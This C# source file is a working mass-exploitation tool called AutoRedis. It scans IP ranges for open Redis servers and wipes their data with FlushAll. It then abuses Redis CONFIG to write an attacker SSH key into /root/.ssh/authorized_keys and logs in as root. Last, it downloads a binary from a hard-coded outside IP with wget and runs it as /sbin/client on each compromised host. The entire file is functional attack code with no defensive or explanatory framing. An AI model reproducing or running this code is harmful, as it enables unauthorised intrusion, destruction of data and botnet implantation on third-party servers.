﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Renci.SshNet;
using ServiceStack.Redis;


namespace AutoRedis
{
    class Program
    {
        public static string Local = @"C:\puppet\";
        public static int port = 6379;
        public static List<string> IpList = new List<string>();
        public static int tnum = 80;

        static void Main(string[] args)
        {
            MultipleThreadResetEvent multiple = new MultipleThreadResetEvent(500);
            var ipsecs = File.ReadAllLines(Local + "ipsec.txt");
            var total = ipsecs.Length;
            double finish = 0;
            foreach (var ipsec in ipsecs)
            {
                Console.WriteLine("start:" + ipsec);
                IpList.Clear();
                var ipqueue = new Queue<string>();
                var ips = ipsec.Split(new char[] {' '}, StringSplitOptions.RemoveEmptyEntries);
                var ip1strs = ips[0].Split('.');
                var ip2strs = ips[1].Split('.');
                int[] ip1 = new int[4];
                int[] ip2 = new int[4];
                for (int i = 0; i < 4; i++)
                {
                    ip1[i] = Convert.ToInt32(ip1strs[i]);
                    ip2[i] = Convert.ToInt32(ip2strs[i]);
                }
                while (ip1[0]*1000000000 + ip1[1]*1000000 + ip1[2]*1000 + ip1[3] <=
                       ip2[0]*1000000000 + ip2[1]*1000000 + ip2[2]*1000 + ip2[3])
                {
                    var ip = ip1[0] + "." + ip1[1] + "." + ip1[2] + "." + ip1[3];
                    ipqueue.Enqueue(ip);
                    ip1[3]++;
                    if (ip1[3] == 256)
                    {
                        ip1[3] = 1;
                        ip1[2]++;
                    }
                    if (ip1[2] == 256)
                    {
                        ip1[2] = 1;
                        ip1[1]++;
                    }
                    if (ip1[1] == 256)
                    {
                        ip1[1] = 1;
                        ip1[0]++;
                    }
                    if (ip1[0] == 256)
                    {
                        break;
                    }
                }
                multiple.SetCurrent(500);
                for (int i = 0; i < 500; i++)
                {
                    new Thread(() =>
                    {
                        while (ipqueue.Count > 0)
                        {
                            Monitor.Enter(ipqueue);
                            if (ipqueue.Count > 0)
                            {
                                var ip = ipqueue.Dequeue();
                                Monitor.Exit(ipqueue);
                                Scanner scanner = new Scanner(ip, port);
                                scanner.Scan();
                            }
                            else
                            {
                                Monitor.Exit(ipqueue);
                            }
                        }
                        multiple.SetOne();
                    }).Start();
                }
                multiple.WaitAll();

                GrepIps(tnum);
                Console.WriteLine("GrepIps Finished");
                Attack(tnum);
                Console.WriteLine("Attack Finished");
                TryLogin(tnum);
                Console.WriteLine("TryLogin Finished");
                Implant(tnum);
                Console.WriteLine("Implant Finished");
                finish++;
                Console.WriteLine(finish/total*100.0);
                Thread.Sleep(5000);
            }
            multiple.Dispose();

            Console.WriteLine("Finished");
            Console.ReadKey();
            Console.ReadKey();
        }

        public static void GrepIps(int tnum = 15)
        {
            List<string> result = new List<string>();
            List<Task> list = new List<Task>();
            Queue<string> queue = new Queue<string>(IpList.AsEnumerable());
            for (int i = 0; i < tnum; i++)
            {
                Task task = new Task(() =>
                {
                    while (queue.Count > 0)
                    {
                        Monitor.Enter(queue);
                        if (queue.Count > 0)
                        {
                            var ip = queue.Dequeue();
                            Monitor.Exit(queue);

                            using (RedisClient client = new RedisClient(ip, 6379))
                            {



                                client.ConnectTimeout = 500;
                                try
                                {
                                    client.RetryTimeout = 500;
                                    client.SendTimeout = 500;
                                    client.ReceiveTimeout = 500;
                                    client.SetConfig("dir", "/root/.ssh/");
                                    client.Save();
                                    result.Add(ip);
                                    //Console.WriteLine("ip:"+ip);
                                }
                                catch (Exception e)
                                {
                                    // Console.WriteLine("failed:" + ip + e.Message);
                                }
                                finally
                                {
                                    client.Dispose();
                                }
                            }
                        }
                        else
                        {
                            Monitor.Exit(queue);
                        }
                    }
                });
                list.Add(task);
                task.Start();
            }
            Task.WaitAll(list.ToArray());
            StringBuilder sb = new StringBuilder();
            foreach (var str in result)
            {
                sb.AppendLine(str);
            }
            File.WriteAllText(Local + "result.txt", sb.ToString());
        }


        public static void Attack(int tnum = 15)
        {
            var text = File.ReadAllText(Local + "foo.txt");
            List<Task> list = new List<Task>();

            var ips = File.ReadAllLines(Local + "result.txt");
            Queue<string> queue = new Queue<string>(ips.AsEnumerable());

            for (int i = 0; i < tnum; i++)
            {
                Task task = new Task(() =>
                {
                    while (queue.Count > 0)
                    {
                        Monitor.Enter(queue);
                        if (queue.Count > 0)
                        {
                            var ip = queue.Dequeue();
                            Monitor.Exit(queue);
                            using (RedisClient client = new RedisClient(ip, 6379))
                            {


                                try
                                {

                                    client.ConnectTimeout = 500;
                                    client.RetryTimeout = 500;
                                    client.SendTimeout = 500;
                                    client.ReceiveTimeout = 500;
                                    client.FlushAll();
                                    for (int j = 0; j < 2; j++)
                                    {
                                        client.Db = 0;
                                        client.Set("crakit", Encoding.ASCII.GetBytes(text));
                                        client.SetConfig("dir", "/root/.ssh/");
                                        string val = null;
                                        if (j == 0)
                                        {
                                            val = "authorized_keys";
                                        }
                                        else if (j == 1)
                                        {
                                            val = "KHK75NEOiq";
                                        }
                                        client.SetConfig("dbfilename", val);
                                        client.Save();
                                        Console.WriteLine(ip + " finished");
                                    }
                                }
                                catch (Exception e)
                                {
                                    //Console.WriteLine(e.Message);
                                }
                            }
                        }
                        else
                        {
                            Monitor.Exit(queue);
                        }
                    }
                });
                list.Add(task);
                task.Start();
            }
            Task.WaitAll(list.ToArray());
        }

        public static void TryLogin(int tnum = 15)
        {
            List<string> result = new List<string>();
            List<Task> list = new List<Task>();
            var ips = File.ReadAllLines(Local + "result.txt");
            Queue<string> queue = new Queue<string>(ips.AsEnumerable());

            for (int i = 0; i < tnum; i++)
            {
                Task task = new Task(() =>
                {
                    while (queue.Count > 0)
                    {
                        Monitor.Enter(queue);
                        if (queue.Count > 0)
                        {
                            var ip = queue.Dequeue();
                            Monitor.Exit(queue);
                            SshClient client = null;
                            try
                            {
                                client = new SshClient(ip, "root", new PrivateKeyFile(Local + "key"));
                                client.Connect();
                                client.RunCommand("whoami");
                                result.Add(ip);
                                Console.WriteLine(ip + " can login");
                            }
                            catch (Exception e)
                            {
                                result.Remove(ip);
                                //Console.WriteLine(e.Message);
                            }
                            finally
                            {
                                client.Dispose();
                            }
                        }
                        else
                        {
                            Monitor.Exit(queue);
                        }
                    }
                });
                list.Add(task);
                task.Start();
            }
            Task.WaitAll(list.ToArray());
            StringBuilder sb = new StringBuilder();
            foreach (var str in result)
            {
                sb.AppendLine(str);
            }
            File.WriteAllText(Local + "canlogin.txt", sb.ToString());
        }


        public static void Implant(int tnum = 15)
        {
            List<string> result = new List<string>();
            List<Task> list = new List<Task>();
            var ips = File.ReadAllLines(Local + "canlogin.txt");
            Queue<string> queue = new Queue<string>(ips.AsEnumerable());

            for (int i = 0; i < tnum; i++)
            {
                Task task = new Task(() =>
                {
                    while (queue.Count > 0)
                    {
                        Monitor.Enter(queue);
                        if (queue.Count > 0)
                        {
                            var ip = queue.Dequeue();
                            Monitor.Exit(queue);
                            SshClient client = null;
                            try
                            {
                                client = new SshClient(ip, "root", new PrivateKeyFile(Local + "key"));
                                client.Connect();
                                var ssh1 =
                                    client.CreateCommand("kill `ps -ef|grep client|grep -v grep|awk '{print $2}'`");
                                ssh1.BeginExecute();
                                Thread.Sleep(500);
                                var ssh2 = client.CreateCommand("rm -f /sbin/client");
                                ssh2.BeginExecute();

                                Thread.Sleep(500);
                                var ssh3 =
                                    client.CreateCommand(
                                        "wget https://123.207.157.21/client -O /sbin/client --no-check-certificate");
                                ssh3.BeginExecute();
                                Console.WriteLine(ip + " start download");
                                Thread.Sleep(5000);
                                var ssh4 = client.CreateCommand("chmod +x /sbin/client");
                                ssh4.BeginExecute();
                                Console.WriteLine(ip + " download ok");
                                Thread.Sleep(500);
                                var ssh = client.CreateCommand("/sbin/client");
                                ssh.BeginExecute();
                                result.Add(ip);
                            }
                            catch (Exception e)
                            {
                                //Console.WriteLine(e.Message);
                            }
                            finally
                            {
                                client.Dispose();
                            }
                        }
                        else
                        {
                            Monitor.Exit(queue);
                        }
                    }
                });
                list.Add(task);
                task.Start();
            }
            Task.WaitAll(list.ToArray());
            StringBuilder sb = new StringBuilder();
            foreach (var str in result)
            {
                sb.AppendLine(str);
            }
            File.WriteAllText(Local + "implant.txt", sb.ToString());
        }
    }

    class Scanner
    {
        private ManualResetEvent TimeoutObject = new ManualResetEvent(false);
        string m_host;
        int m_port;

        public Scanner(string host, int port)
        {
            m_host = host;
            m_port = port;
        }

        public void Scan()
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            try
            {
                socket.BeginConnect(m_host, m_port, o => { TimeoutObject.Set(); }, null);
                TimeoutObject.WaitOne(500, false);
                if (socket.Connected)
                {
                    Program.IpList.Add(m_host);
                    Console.WriteLine(m_host + " 已连接");
                }
                else
                {
                    // Console.WriteLine(m_host + " 连接失败");
                }
            }
            catch (Exception)
            {
            }
            finally
            {
                socket.Dispose();
            }
        }
    }
}